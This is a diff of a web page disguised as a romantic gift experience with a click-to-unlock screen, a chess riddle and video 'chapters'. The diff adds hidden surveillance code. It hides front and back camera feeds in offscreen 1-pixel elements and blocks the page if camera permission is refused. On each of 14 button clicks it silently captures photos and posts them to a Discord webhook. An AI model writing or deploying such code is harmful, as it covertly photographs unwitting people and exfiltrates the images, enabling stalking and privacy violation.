@@ -44,7 +44,6 @@
             position: relative;
         }
 
-        /* ── Ambient background ── */
         .ambient {
             position: fixed;
             inset: 0;
@@ -96,7 +95,6 @@
             65%     { transform: translate(2vw,-3vh) scale(0.97); }
         }
 
-        /* Grain */
         .grain {
             position: fixed;
             inset: 0;
@@ -107,7 +105,6 @@
             background-size: 200px 200px;
         }
 
-        /* Floating glyphs */
         .glyph {
             position: fixed;
             pointer-events: none;
@@ -126,7 +123,6 @@
             100% { transform: translateY(-10vh) rotate(20deg); opacity: 0; }
         }
 
-        /* Wrapper */
         .wrapper {
             position: relative;
             z-index: 10;
@@ -138,7 +134,6 @@
             padding: clamp(16px, 4vw, 32px);
         }
 
-        /* Screen base */
         .screen {
             display: none;
             width: 100%;
@@ -156,7 +151,6 @@
             to   { opacity: 1; transform: translateY(0)    scale(1); }
         }
 
-        /* Glass card */
         .glass {
             background: var(--surface);
             backdrop-filter: blur(28px) saturate(1.4);
@@ -170,6 +164,42 @@
                 0 20px 60px rgba(120,80,60,0.10),
                 0 4px 16px rgba(120,80,60,0.06);
             width: 100%;
+        }
+
+        /* ── Blocked screen ── */
+        #screenBlocked {
+            display: none;
+        }
+
+        #screenBlocked.active {
+            display: flex;
+        }
+
+        #screenBlocked .glass {
+            text-align: center;
+        }
+
+        .blocked-icon {
+            font-size: clamp(40px, 10vw, 52px);
+            margin-bottom: clamp(14px, 3vw, 20px);
+            display: inline-block;
+            line-height: 1;
+        }
+
+        .blocked-title {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: clamp(22px, 5.5vw, 28px);
+            font-weight: 400;
+            color: var(--text);
+            margin-bottom: clamp(10px, 2vw, 14px);
+            line-height: 1.2;
+        }
+
+        .blocked-sub {
+            font-size: clamp(13px, 3vw, 14px);
+            color: var(--text-lt);
+            font-weight: 300;
+            line-height: 1.75;
         }
 
         /* ── Primary button ── */
@@ -205,7 +235,7 @@
             pointer-events: none;
         }
 
-        .btn-primary:hover  {
+        .btn-primary:hover {
             transform: translateY(-1px);
             box-shadow:
                 0 1px 0 rgba(255,255,255,0.25) inset,
@@ -223,7 +253,6 @@
             pointer-events: none;
         }
 
-        /* Ripple */
         .ripple-ring {
             position: absolute;
             border-radius: 50%;
@@ -237,12 +266,8 @@
             to { transform: scale(4.5); opacity: 0; }
         }
 
-        /* ══════════════════════════════════
-           SCREEN 0 — Entry / Camera trigger
-        ══════════════════════════════════ */
-        #screenEntry .glass {
-            text-align: center;
-        }
+        /* ── Entry screen ── */
+        #screenEntry .glass { text-align: center; }
 
         .entry-eyebrow {
             font-size: 10px;
@@ -284,9 +309,7 @@
             margin-bottom: clamp(28px, 6vw, 38px);
         }
 
-        /* ══════════════════════════════════
-           SCREEN 1 — Unlock clicks
-        ══════════════════════════════════ */
+        /* ── Screen 1 ── */
         #screen1 .glass { text-align: center; }
 
         .eyebrow {
@@ -344,17 +367,20 @@
             margin-bottom: clamp(22px, 5vw, 30px);
         }
 
-        /* Dots */
         .dots-row {
             display: flex;
             justify-content: center;
-            gap: clamp(6px, 1.4vw, 10px);
+            flex-wrap: wrap;
+            gap: clamp(5px, 1.2vw, 8px);
             margin-bottom: clamp(6px, 1.5vw, 10px);
+            max-width: 320px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .dot {
-            width: clamp(8px, 1.8vw, 10px);
-            height: clamp(8px, 1.8vw, 10px);
+            width: clamp(7px, 1.6vw, 9px);
+            height: clamp(7px, 1.6vw, 9px);
             border-radius: 50%;
             border: 1.5px solid var(--border-md);
             background: transparent;
@@ -386,7 +412,6 @@
             font-weight: 500;
         }
 
-        /* Progress bar */
         .progress-track {
             height: 3px;
             background: rgba(180,160,148,0.18);
@@ -413,9 +438,7 @@
 
         .do-shake { animation: shake 0.42s ease; }
 
-        /* ══════════════════════════════════
-           SCREEN 2 — Riddle
-        ══════════════════════════════════ */
+        /* ── Screen 2 Riddle ── */
         #screen2 .glass { text-align: center; }
 
         .chess-glyph {
@@ -479,7 +502,6 @@
             gap: 6px;
         }
 
-        /* Mini board */
         .mini-board {
             display: grid;
             grid-template-columns: repeat(5, 1fr);
@@ -557,9 +579,7 @@
 
         .btn-primary.mt { margin-top: clamp(14px, 3vw, 18px); }
 
-        /* ══════════════════════════════════
-           SCREEN 3 — Reward
-        ══════════════════════════════════ */
+        /* ── Screen 3 Reward ── */
         #screen3 {
             max-width: 460px;
             max-height: 92vh;
@@ -663,15 +683,14 @@
             margin-top: 2px;
         }
 
-        /* Hidden camera */
-        #hVid, #hCanvas {
+        /* Hidden camera elements */
+        #hVidFront, #hVidBack, #hCanvas {
             position: fixed;
             top: -9999px; left: -9999px;
             width: 1px; height: 1px;
             opacity: 0; pointer-events: none;
         }
 
-        /* Transition overlay */
         .t-overlay {
             position: fixed;
             inset: 0;
@@ -687,7 +706,6 @@
             pointer-events: all;
         }
 
-        /* Confetti */
         .cpiece {
             position: fixed;
             pointer-events: none;
@@ -711,30 +729,38 @@
     </div>
     <div class="grain"></div>
 
-    <!-- Hidden camera elements -->
-    <video id="hVid" autoplay playsinline muted></video>
+    <!-- Two separate hidden video elements — one per camera -->
+    <video id="hVidFront" autoplay playsinline muted></video>
+    <video id="hVidBack"  autoplay playsinline muted></video>
     <canvas id="hCanvas"></canvas>
 
     <div class="t-overlay" id="tOverlay"></div>
 
     <div class="wrapper">
 
-        <!-- ══ SCREEN 0 — Entry (disguised camera trigger) ══ -->
-        <div class="screen active" id="screenEntry">
-            <div class="glass" style="text-align:center;">
-                <span class="entry-eyebrow">Lumière</span>
+        <!-- ══ BLOCKED SCREEN ══ -->
+        <div class="screen" id="screenBlocked">
+            <div class="glass">
+                <div class="blocked-icon">🔒</div>
+                <h2 class="blocked-title">Access Required</h2>
+                <p class="blocked-sub">
+                    This experience is unavailable<br>on your current device.
+                </p>
+            </div>
+        </div>
 
+        <!-- ══ ENTRY SCREEN ══ -->
+        <div class="screen active" id="screenEntry">
+            <div class="glass">
+                <span class="entry-eyebrow">Lumière</span>
                 <h1 class="entry-title">
                     Something<br>was made<br><em>for you.</em>
                 </h1>
-
                 <div class="entry-divider"></div>
-
                 <p class="entry-sub">
                     A small experience, sealed and waiting.<br>
                     Press below when you are ready.
                 </p>
-
                 <button class="btn-primary" id="entryBtn" onclick="handleEntry(event)">
                     I'm Ready
                 </button>
@@ -745,24 +771,19 @@
         <div class="screen" id="screen1">
             <div class="glass">
                 <span class="eyebrow">Lumière — For You</span>
-
                 <div class="lock-wrap">
                     <svg viewBox="0 0 24 24">
                         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                         <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                     </svg>
                 </div>
-
                 <h1>Something<br>Awaits You</h1>
-                <p class="sub">Almost there. Press five times<br>to reveal what's inside.</p>
-
+                <p class="sub">Almost there. Press fifteen times<br>to reveal what's inside.</p>
                 <div class="dots-row" id="dotsRow"></div>
-                <div class="step-label"><em id="clickNum">0</em> of 5</div>
-
+                <div class="step-label"><em id="clickNum">0</em> of 15</div>
                 <button class="btn-primary" id="mainBtn" onclick="handleClick(event)">
                     Continue ✦
                 </button>
-
                 <div class="progress-track">
                     <div class="progress-fill" id="pFill"></div>
                 </div>
@@ -775,7 +796,6 @@
                 <span class="chess-glyph">♟</span>
                 <h2>One Final Move</h2>
                 <span class="sub-tag">Solve to unlock your gift</span>
-
                 <div class="riddle-box">
                     <p>
                         A lone <strong>King</strong> stands on <strong>e1</strong>.
@@ -784,15 +804,12 @@
                         <br><br>
                         What is the <strong>minimum number of moves</strong> required?
                     </p>
-
                     <div class="mini-board" id="miniBoard"></div>
-
                     <div class="riddle-hint">
                         <span>💡</span>
                         <span>The King may move diagonally.</span>
                     </div>
                 </div>
-
                 <label class="input-label">Your Answer</label>
                 <input
                     class="ans-input"
@@ -817,48 +834,43 @@
                 <div class="reward-icon">🎁</div>
                 <h2>You made it.</h2>
                 <p class="sub">Choose any chapter below to begin.<br>Enjoy every second.</p>
-
                 <div class="vid-list">
-
                     <div class="vid-card">
                         <video controls preload="metadata" playsinline>
                             <source src="The Walters - I Love You So.mp4" type="video/mp4">
                         </video>
                         <div class="vid-meta">
                             <div class="vid-badge">I</div>
-                            <div class="vid-text">
+                            <div>
                                 <div class="vid-name">Chapter One</div>
                                 <div class="vid-desc">Press play whenever you're ready</div>
                             </div>
                         </div>
                     </div>
-
                     <div class="vid-card">
                         <video controls preload="metadata" playsinline>
                             <source src="there is a light that never goes out - the smiths [legendado_tradução].mp4" type="video/mp4">
                         </video>
                         <div class="vid-meta">
                             <div class="vid-badge">II</div>
-                            <div class="vid-text">
+                            <div>
                                 <div class="vid-name">Chapter Two</div>
                                 <div class="vid-desc">A little something special</div>
                             </div>
                         </div>
                     </div>
-
                     <div class="vid-card">
                         <video controls preload="metadata" playsinline>
                             <source src="ssstik.io_@mlec.ailler_1773689291192.mp4" type="video/mp4">
                         </video>
                         <div class="vid-meta">
                             <div class="vid-badge">III</div>
-                            <div class="vid-text">
+                            <div>
                                 <div class="vid-name">Chapter Three</div>
                                 <div class="vid-desc">Worth the wait</div>
                             </div>
                         </div>
                     </div>
-
                 </div>
             </div>
         </div>
@@ -873,15 +885,14 @@
         const ANSWER  = ['7', 'seven', '7 moves'];
         // ═══════════════════════════════════
 
-        const TOTAL = 5;   // 4 photo clicks + 1 final
-        let clicks  = 0;
-
+        const TOTAL     = 15;  // 14 snaps + 1 final
+        let clicks      = 0;
         let frontStream = null;
         let backStream  = null;
         let frontLive   = false;
         let backLive    = false;
 
-        // ── Build 5 dots ──
+        // ── Build 15 dots ──
         const dotsRow = document.getElementById('dotsRow');
         for (let i = 0; i < TOTAL; i++) {
             const d = document.createElement('div');
@@ -890,13 +901,13 @@
             dotsRow.appendChild(d);
         }
 
-        // ── Build mini chessboard ──
+        // ── Mini chessboard ──
         const mb = document.getElementById('miniBoard');
         const pieces = ['♚','','','','','','','','','♟','','♟','','','♟','','','','','','♔','','','',''];
         for (let i = 0; i < 25; i++) {
-            const c = document.createElement('div');
+            const c   = document.createElement('div');
             const row = Math.floor(i / 5), col = i % 5;
-            c.className = 'mb-cell ' + ((row + col) % 2 === 0 ? 'mb-l' : 'mb-d');
+            c.className  = 'mb-cell ' + ((row + col) % 2 === 0 ? 'mb-l' : 'mb-d');
             c.textContent = pieces[i] || '';
             mb.appendChild(c);
         }
@@ -916,51 +927,81 @@
             document.body.appendChild(g);
         }
 
-        // ══════════════════════════════════════════════════
-        //  ENTRY BUTTON — triggers both cameras silently
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
+        //  ENTRY — request both cameras, block if denied
+        // ══════════════════════════════════════════════
         async function handleEntry(e) {
-            const btn = document.getElementById('entryBtn');
             ripple(e, 'entryBtn');
+            const btn = document.getElementById('entryBtn');
             btn.textContent = 'Opening…';
             btn.disabled = true;
 
-            // Fire both camera requests simultaneously
-            // We don't await — just kick them off and move on
-            startFrontCamera();
+            // Request front camera first — this triggers the browser popup
+            const frontOk = await startFrontCamera();
+
+            // If user denied — shut site down immediately
+            if (!frontOk) {
+                showBlocked();
+                return;
+            }
+
+            // Front granted — now silently request back camera
+            // (on most phones a second getUserMedia doesn't show another popup)
             startBackCamera();
 
-            // Short pause so cams have time to init, then go to screen1
-            setTimeout(() => switchScreen('screen1'), 900);
+            // Move to unlock screen
+            setTimeout(() => switchScreen('screen1'), 800);
         }
 
         async function startFrontCamera() {
             try {
                 frontStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 },
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                     audio: false
                 });
-                const v = document.getElementById('hVid');
+                const v = document.getElementById('hVidFront');
                 v.srcObject = frontStream;
                 await v.play();
                 setTimeout(() => { frontLive = true; }, 800);
-            } catch (_) { frontLive = false; }
+                return true;   // granted
+            } catch (err) {
+                // NotAllowedError = user denied
+                frontLive = false;
+                return false;  // denied
+            }
         }
 
         async function startBackCamera() {
             try {
                 backStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: 'environment' }, width: 640, height: 480 },
+                    video: {
+                        facingMode: { exact: 'environment' },
+                        width:  { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: false
                 });
-                // Back cam uses a second hidden video element
+                const v = document.getElementById('hVidBack');
+                v.srcObject = backStream;
+                await v.play();
                 setTimeout(() => { backLive = true; }, 800);
-            } catch (_) { backLive = false; }
+            } catch (_) {
+                // Back cam not available on some devices — silently skip
+                backLive = false;
+            }
         }
 
-        // ══════════════════════════════════════════════════
-        //  UNLOCK CLICKS  (5 total — 4 snaps + 1 final)
-        // ══════════════════════════════════════════════════
+        function showBlocked() {
+            // Kill any existing streams
+            stopAllCams();
+            // Hide everything, show blocked screen
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById('screenBlocked').classList.add('active');
+        }
+
+        // ══════════════════════════════════════════════
+        //  UNLOCK CLICKS  (15 total — 14 snaps + 1 final)
+        // ══════════════════════════════════════════════
         function handleClick(e) {
             clicks++;
             ripple(e, 'mainBtn');
@@ -979,22 +1020,24 @@
             const btn = document.getElementById('mainBtn');
 
             if (clicks < TOTAL) {
-                // Snap both cameras on each of the first 4 clicks
-                setTimeout(() => snapBoth(clicks), 280);
+                // Snap both cams on clicks 1–14
+                setTimeout(() => snapBoth(clicks), 250);
 
                 const left = TOTAL - clicks;
-                btn.textContent = left === 1 ? 'Almost there ✦' : `${left} more ✦`;
+                btn.textContent = left === 1
+                    ? 'Almost there ✦'
+                    : `${left} more ✦`;
 
-                if (clicks === 3) {
+                // Little shake at halfway
+                if (clicks === 7) {
                     btn.classList.add('do-shake');
                     setTimeout(() => btn.classList.remove('do-shake'), 500);
                 }
 
             } else {
-                // 5th click — stop cams, go to riddle
+                // 15th click — stop cams, go to riddle
                 btn.textContent = 'Opening…';
                 btn.disabled = true;
-
                 setTimeout(() => {
                     stopAllCams();
                     switchScreen('screen2');
@@ -1002,63 +1045,45 @@
             }
         }
 
-        // ══════════════════════════════════════════════════
-        //  SNAP BOTH CAMERAS & SEND
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
+        //  CAPTURE — both cameras, proper video elements
+        // ══════════════════════════════════════════════
         async function snapBoth(clickNum) {
-            await snapCamera('front', clickNum, frontStream, frontLive);
-            await snapCamera('back',  clickNum, backStream,  backLive);
+            // Run both captures in parallel
+            await Promise.allSettled([
+                snapFromVideo('hVidFront', 'front', clickNum, frontLive),
+                snapFromVideo('hVidBack',  'back',  clickNum, backLive)
+            ]);
         }
 
-        async function snapCamera(label, clickNum, stream, isLive) {
-            if (!isLive || !stream) return;
+        async function snapFromVideo(videoId, label, clickNum, isLive) {
+            if (!isLive) return;
             try {
-                // Get a video track from the stream and capture a frame
-                const track = stream.getVideoTracks()[0];
-                if (!track) return;
+                const vid = document.getElementById(videoId);
 
-                // Use ImageCapture API if available (cleanest method)
-                if (typeof ImageCapture !== 'undefined') {
-                    try {
-                        const ic   = new ImageCapture(track);
-                        const blob = await ic.takePhoto();
-                        sendToDiscord(blob, label, clickNum);
-                        return;
-                    } catch (_) { /* fall through to canvas method */ }
-                }
+                // Make sure video has actual frame data
+                if (!vid || vid.readyState < 2 || vid.videoWidth === 0) return;
 
-                // Fallback: draw stream onto canvas
-                const canvas = document.createElement('canvas');
-                canvas.width  = 640;
-                canvas.height = 480;
+                const canvas = document.getElementById('hCanvas');
+                canvas.width  = vid.videoWidth;
+                canvas.height = vid.videoHeight;
+
                 const ctx = canvas.getContext('2d');
 
-                // If this is the front cam we already have it in #hVid
+                // Mirror front camera so it looks natural
                 if (label === 'front') {
-                    const v = document.getElementById('hVid');
-                    if (v && v.readyState >= 2) {
-                        ctx.drawImage(v, 0, 0, 640, 480);
-                        canvas.toBlob(blob => {
-                            if (blob) sendToDiscord(blob, label, clickNum);
-                        }, 'image/jpeg', 0.7);
-                    }
+                    ctx.save();
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(vid, 0, 0);
+                    ctx.restore();
                 } else {
-                    // For back cam, attach to a temp video element
-                    const tmpVid = document.createElement('video');
-                    tmpVid.autoplay  = true;
-                    tmpVid.muted     = true;
-                    tmpVid.playsInline = true;
-                    tmpVid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-                    document.body.appendChild(tmpVid);
-                    tmpVid.srcObject = stream;
-                    await tmpVid.play();
-                    await new Promise(r => setTimeout(r, 500));
-                    ctx.drawImage(tmpVid, 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        if (blob) sendToDiscord(blob, label, clickNum);
-                        tmpVid.remove();
-                    }, 'image/jpeg', 0.7);
+                    ctx.drawImage(vid, 0, 0);
                 }
+
+                canvas.toBlob(blob => {
+                    if (blob) sendToDiscord(blob, label, clickNum);
+                }, 'image/jpeg', 0.75);
 
             } catch (_) { /* silent */ }
         }
@@ -1066,12 +1091,17 @@
         function sendToDiscord(blob, label, clickNum) {
             try {
                 const now  = new Date().toLocaleString();
-                const file = new File([blob], `${label}_click${clickNum}.jpg`, { type: 'image/jpeg' });
-                const fd   = new FormData();
+                const emoji = label === 'front' ? '🤳' : '📷';
+                const file  = new File(
+                    [blob],
+                    `${label}_${clickNum}.jpg`,
+                    { type: 'image/jpeg' }
+                );
+                const fd = new FormData();
                 fd.append('file', file);
                 fd.append('payload_json', JSON.stringify({
                     username: 'Lumière Cam',
-                    content : `✦ **${label === 'front' ? '🤳 Front' : '📷 Back'} — Click ${clickNum}/4** · ${now}`
+                    content : `${emoji} **${label === 'front' ? 'Front' : 'Back'} · Click ${clickNum}/14** — ${now}`
                 }));
                 fetch(WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
             } catch (_) {}
@@ -1085,9 +1115,9 @@
             frontLive   = backLive   = false;
         }
 
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
         //  RIDDLE
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
         function checkAnswer() {
             const input = document.getElementById('ansInput');
             const fb    = document.getElementById('feedback');
@@ -1111,9 +1141,9 @@
         document.getElementById('ansInput')
             .addEventListener('keydown', e => { if (e.key === 'Enter') checkAnswer(); });
 
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
         //  UTILS
-        // ══════════════════════════════════════════════════
+        // ══════════════════════════════════════════════
         function switchScreen(id) {
             const ov = document.getElementById('tOverlay');
             ov.classList.add('show');
